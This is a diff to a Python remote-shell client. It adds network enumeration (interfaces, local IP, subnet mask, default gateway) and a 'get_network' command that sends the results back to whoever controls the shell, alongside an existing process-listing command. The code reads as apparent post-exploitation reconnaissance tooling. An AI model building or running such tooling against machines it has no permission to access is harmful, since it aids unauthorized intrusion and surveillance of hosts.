@@ -2,6 +2,7 @@ import psutil
 import socket
 import sys
 import time
+import netifaces
 
 
 class Enumerate:
@@ -26,6 +27,62 @@ class Enumerate:
                 # Ignore errors
                 pass
         return return_statement
+
+    @staticmethod
+    def get_local_ip():
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
+        s.connect(('1.1.1.1', 80))  # connect to remote host (cloudfare dns)
+        local_ip = s.getsockname()[0]  # get ip from socket
+        s.close()  # close socket
+        return local_ip
+
+    @staticmethod
+    def get_subnet_mask():
+        ifaces = netifaces.interfaces()  # get network interfaces
+        for iface in ifaces:
+            iface_addresses = netifaces.ifaddresses(iface)  # get addresses associated with interface
+            if netifaces.AF_INET in iface_addresses:  # if it contains an ipv4 address
+                addr_info = iface_addresses[netifaces.AF_INET][0]  # get first ipv4 in list
+                if 'netmask' in addr_info:
+                    return addr_info['netmask']  # return subnet mask
+
+    @staticmethod
+    def get_interfaces():
+        return_statement = ""
+        ifaces = netifaces.interfaces()  # get interfaces
+
+        gateway_addresses = netifaces.gateways()  # get gateway addresses
+        if netifaces.AF_INET in gateway_addresses['default']:  # if it is default gateway
+            default_interface = gateway_addresses['default'][netifaces.AF_INET][1]  # store interface as default
+
+        for iface in ifaces:
+            if iface == default_interface:
+                return_statement += f"{iface} (default)\n"
+            else:
+                return_statement += f"{iface}\n"
+        return return_statement
+
+    @staticmethod
+    def get_default_gateway():
+        gateway_addresses = netifaces.gateways()  # get gateway addresses
+        if 'default' in gateway_addresses and netifaces.AF_INET in gateway_addresses['default']:  # if there is a
+            # default route entry
+            return gateway_addresses['default'][netifaces.AF_INET][0]  # return the first address
+
+    def get_network_info(self):
+        try:
+            data = ""
+            data += f"Network Interfaces: \n{self.get_interfaces()}\n"  # get interfaces on local machine
+            data += f"Local IP: {self.get_local_ip()}\n"  # get local ip of machine
+            data += f"Subnet Mask: {self.get_subnet_mask()}\n"  # get subnet mask of network
+            data += f"Default Gateway: {self.get_default_gateway()}\n"  # get default gateway of machine
+        except OSError:
+            # no internet connection to reach 1.1.1.1
+            data = "\nFailed due to connection\n"
+        except UnboundLocalError:
+            # No interfaces available
+            data = "\nNo interfaces available\n"
+        return data
 
 
 class Shell(Enumerate):
@@ -64,6 +121,9 @@ class Shell(Enumerate):
                     sys.exit(0)
                 elif 'get_processes' in command:
                     result = self.get_processes()
+                    self.send(result)
+                elif 'get_network' in command:
+                    result = self.get_network_info()
                     self.send(result)
                 else:
                     print(command)
